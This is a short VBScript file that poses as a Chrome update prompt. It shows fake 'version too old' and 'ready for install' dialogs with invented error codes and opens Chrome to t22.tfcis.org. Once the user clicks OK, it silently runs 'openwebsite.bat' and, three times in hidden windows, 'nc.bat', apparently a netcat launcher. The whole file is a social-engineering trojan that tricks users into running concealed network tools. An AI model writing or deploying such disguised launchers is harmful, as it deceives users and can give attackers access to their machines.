set cmd = createobject("wscript.shell")

Sub openchrome()
    cmd.run("chrome.exe t22.tfcis.org")
End Sub

Sub canclemsg()
    err = MsgBox("Didn't update chrome"+vbCrLf+"error exit(x64e5487333)",16,"Error")
End Sub

Sub surmsg()
    sure = MsgBox("Chrome version(x86e10055) is ready for install"+vbCrLf+"press OK to install",33,"Install")
    if sure = vbOK then
        netcatrun
    else
        canclemsg
    end if
End Sub

Sub netcatrun()
    cmd.run chr(34)&"openwebsite.bat"&chr(34),0
    i=0
    do while i<3
        Set WshShell = CreateObject("WScript.Shell") 
        WshShell.Run chr(34) & "nc.bat" & chr(34), 0
        Set WshShell = Nothing
        i=i+1
    loop
End Sub

Sub main()
    updtmsg = MsgBox("Your chrome version is too old"+vbCrLf+"please press OK to update",65,"update")
    if updtmsg = vbOK then
        surmsg
    else
        canclemsg
    end if
End Sub

'main
main